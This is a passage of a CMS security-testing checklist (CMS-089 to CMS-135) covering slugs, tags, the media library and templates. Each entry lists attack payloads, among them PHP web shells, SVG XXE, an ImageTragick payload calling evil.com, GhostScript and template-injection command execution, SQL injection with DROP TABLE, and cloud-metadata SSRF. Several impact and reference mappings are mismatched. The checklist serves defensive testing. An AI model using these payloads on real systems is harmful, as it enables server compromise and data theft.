## CMS-089 — Tag Cloud XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create tags with XSS 2. View tag cloud widget 3. Multiple XSS execution

**Expected Result:** Tag cloud should sanitize all tags

**Payload Example:**

```
Multiple tags with different XSS payloads
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-090 — CSRF on Category Creation
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create malicious page 2. Auto-create category 3. Spam categories

**Expected Result:** Category creation should have CSRF protection

**Payload Example:**

```
<form action="/admin/categories/create" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## CMS-091 — Path Traversal via Slug
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create content 2. Set slug with path traversal 3. Access file system

**Expected Result:** Slugs should be strictly sanitized

**Payload Example:**

```
slug=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-092 — SQL Injection in Slug
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create content with SQL in slug 2. Access via URL 3. Trigger injection

**Expected Result:** Slugs should be parameterized in queries

**Payload Example:**

```
slug=test'; DROP TABLE content;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-093 — Slug XSS Reflection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Access non-existent slug 2. Slug reflected in error 3. XSS in error page

**Expected Result:** Error pages should encode slug

**Payload Example:**

```
/content/<script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-094 — Slug Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Brute force common slugs 2. Discover hidden content 3. Map site structure

**Expected Result:** Rate limiting should prevent enumeration

**Payload Example:**

```
/admin /private /internal slug guessing
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf / dirsearch

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-095 — Slug Collision Exploitation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create content with existing slug 2. Override or conflict 3. Content hijacking

**Expected Result:** Slug uniqueness should be enforced

**Payload Example:**

```
Create duplicate slugs for different content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-096 — Unicode Normalization Attack
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create slug with Unicode variations 2. Access via normalized URL 3. Bypass access controls

**Expected Result:** Unicode should be normalized

**Payload Example:**

```
/contеnt (Cyrillic е) vs /content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## CMS-097 — Slug Length Overflow
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create extremely long slug 2. Check for truncation issues 3. Bypass validation

**Expected Result:** Slug length should be limited

**Payload Example:**

```
slug=A*10000
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## CMS-098 — Reserved Slug Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Identify reserved slugs 2. Create content with reserved slug 3. Override system pages

**Expected Result:** Reserved slugs should be protected

**Payload Example:**

```
Create /admin /login /api slugs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-099 — Case Sensitivity Exploitation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create slug with specific case 2. Access with different case 3. Content duplication or bypass

**Expected Result:** Case handling should be consistent

**Payload Example:**

```
/Content vs /content vs /CONTENT
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## CMS-100 — Null Byte in Slug
**Test Category:** Security Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Insert null byte in slug 2. Bypass extension validation 3. File access

**Expected Result:** Null bytes should be rejected

**Payload Example:**

```
slug=page.php%00.html
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## CMS-101 — Slug Redirect Manipulation
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create slug 2. Configure redirect 3. Open redirect vulnerability

**Expected Result:** Redirects should validate destinations

**Payload Example:**

```
slug redirecting to https://evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Postman

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## CMS-102 — Old Slug Access After Change
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** URL Slug Management

**Test Steps:** 1. Create content with slug 2. Change slug 3. Access via old slug

**Expected Result:** Old slugs should redirect or return 404

**Payload Example:**

```
Access content via previous slug
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-103 — Unrestricted File Upload - Web Shell
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload PHP/JSP/ASP file 2. Access uploaded file 3. Execute code

**Expected Result:** Application should restrict executable files

**Payload Example:**

```
shell.php containing <?php system($_GET['cmd']); ?>
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Weevely / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-104 — File Upload - Double Extension
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload file.php.jpg 2. Server processes as PHP 3. Code execution

**Expected Result:** All extensions should be validated

**Payload Example:**

```
shell.php.jpg or shell.php.png
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-105 — File Upload - Null Byte Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload file.php%00.jpg 2. Extension truncated 3. Execute PHP

**Expected Result:** Null bytes should be rejected

**Payload Example:**

```
shell.php%00.jpg or shell.php\x00.png
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-106 — File Upload - Content-Type Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload PHP with image Content-Type 2. Bypass MIME check 3. Execute code

**Expected Result:** Content validation should check actual file

**Payload Example:**

```
Content-Type: image/jpeg with PHP content
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-107 — File Upload - Magic Bytes Bypass
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Prepend image magic bytes to shell 2. Upload file 3. Execute code

**Expected Result:** Full file content should be validated

**Payload Example:**

```
GIF89a<?php system($_GET['cmd']); ?>
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Hexeditor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## CMS-108 — File Upload - SVG XXE
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload SVG with XXE payload 2. Server processes SVG 3. Extract files

**Expected Result:** SVG processing should disable entities

**Payload Example:**

```
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## CMS-109 — File Upload - SVG XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload SVG with JavaScript 2. Access SVG directly 3. XSS execution

**Expected Result:** SVG should be sanitized or served as attachment

**Payload Example:**

```
<svg onload=alert('XSS')></svg>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-110 — File Upload - Path Traversal
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload with path in filename 2. Store outside upload directory 3. Overwrite files

**Expected Result:** Filenames should be sanitized

**Payload Example:**

```
filename="../../../var/www/shell.php"
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-111 — File Upload - SSRF via URL
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Find URL-based upload 2. Provide internal URL 3. Access internal resources

**Expected Result:** URL uploads should validate destinations

**Payload Example:**

```
url=http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-112 — Media Library IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Access own media 2. Modify media_id 3. Access/delete others' media

**Expected Result:** Media access should verify ownership

**Payload Example:**

```
GET /api/media/victim_media_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-113 — Media Delete IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Delete own media 2. Modify media_id 3. Delete others' files

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/media/victim_media_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-114 — ImageMagick RCE
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload malicious MVG/SVG 2. Trigger ImageMagick processing 3. Code execution

**Expected Result:** ImageMagick should be patched and configured

**Payload Example:**

```
push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://evil.com"|ls "-la)'
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** ImageTragick / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-115 — GhostScript RCE
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload malicious PDF/EPS 2. Trigger GhostScript processing 3. Execute code

**Expected Result:** GhostScript should be sandboxed

**Payload Example:**

```
(%pipe%id) (w) file
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** GhostButt / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-116 — Zip Slip Vulnerability
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload zip with path traversal 2. Trigger extraction 3. Overwrite files

**Expected Result:** Archive extraction should validate paths

**Payload Example:**

```
Zip entry: ../../../var/www/shell.php
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Zip Slip Scanner / evilarc

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-117 — Media Metadata XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload image with XSS in EXIF 2. Display metadata 3. XSS execution

**Expected Result:** Metadata should be sanitized before display

**Payload Example:**

```
EXIF comment: <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** ExifTool / Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-118 — Filename XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload file with XSS in name 2. View media library 3. XSS executes

**Expected Result:** Filenames should be sanitized

**Payload Example:**

```
<script>alert('XSS')</script>.jpg
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-119 — Media URL Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Analyze media URL structure 2. Enumerate media IDs 3. Access private media

**Expected Result:** Media URLs should be unpredictable

**Payload Example:**

```
/uploads/2024/01/image_001.jpg to image_999.jpg
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-120 — Denial of Service via Large File
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload extremely large file 2. Exhaust storage/memory 3. Service disruption

**Expected Result:** File size should be limited

**Payload Example:**

```
Upload 10GB file
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / curl

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-121 — Zip Bomb Upload
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload zip bomb 2. Trigger extraction 3. Exhaust disk space

**Expected Result:** Decompression should be limited

**Payload Example:**

```
42.zip (recursive compression)
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Custom Zip / Burp Suite

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-122 — CORS Misconfiguration on Media
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Check CORS headers on media 2. Access from unauthorized origin 3. Steal media cross-origin

**Expected Result:** CORS should restrict origins

**Payload Example:**

```
Access private media from evil.com
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## CMS-123 — Missing Access Control on Direct URL
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Media Library

**Test Steps:** 1. Upload private media 2. Get direct URL 3. Access without auth

**Expected Result:** Direct URLs should require auth

**Payload Example:**

```
Access /uploads/private/file.pdf without login
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-124 — Server-Side Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Edit template 2. Inject SSTI payload 3. Execute code

**Expected Result:** User input should not be templated

**Payload Example:**

```
{{7*7}} or ${7*'7'} or <%= system('id') %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## CMS-125 — Template IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. View own templates 2. Modify template_id 3. View others' templates

**Expected Result:** Template access should verify ownership

**Payload Example:**

```
GET /api/templates/victim_template_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-126 — Template IDOR Edit
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Edit own template 2. Modify template_id 3. Edit system templates

**Expected Result:** Template editing should verify permissions

**Payload Example:**

```
PUT /api/templates/system_template_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-127 — Template IDOR Delete
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Delete own template 2. Modify template_id 3. Delete others' templates

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/templates/victim_template_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-128 — Template Code Injection
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Find code execution in template 2. Inject malicious code 3. Execute server-side

**Expected Result:** Template code should be sandboxed

**Payload Example:**

```
{% import os %}{{ os.popen('id').read() }}
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** Burp Suite / Tplmap

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-129 — Template XSS Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Edit template with XSS 2. View page using template 3. Execute script

**Expected Result:** Template output should be escaped

**Payload Example:**

```
<script>alert('XSS')</script> in template
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-130 — Template Include Path Traversal
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Use template include directive 2. Traverse to system files 3. Include sensitive files

**Expected Result:** Include paths should be restricted

**Payload Example:**

```
{% include '../../../etc/passwd' %}
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-131 — Template Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Modify template 2. Poison cached version 3. Serve malicious content

**Expected Result:** Template cache should be properly managed

**Payload Example:**

```
Inject malicious content into cached template
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## CMS-132 — Template Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Access as contributor 2. Modify global templates 3. Affect all users

**Expected Result:** Template permissions should be role-based

**Payload Example:**

```
Edit header.html as low-privilege user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-133 — Template Syntax Error DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Introduce syntax error 2. Break template rendering 3. Site unavailable

**Expected Result:** Syntax errors should be caught gracefully

**Payload Example:**

```
{{ invalid syntax }}} breaking rendering
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-134 — Template Variable Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Find user-controlled variables 2. Inject template syntax 3. Execute code

**Expected Result:** Variables should be escaped

**Payload Example:**

```
username={{constructor.constructor('return this')()}}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Tplmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-135 — Template Version Control Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Template Management

**Test Steps:** 1. Access template versions 2. Restore malicious version 3. Inject backdoor
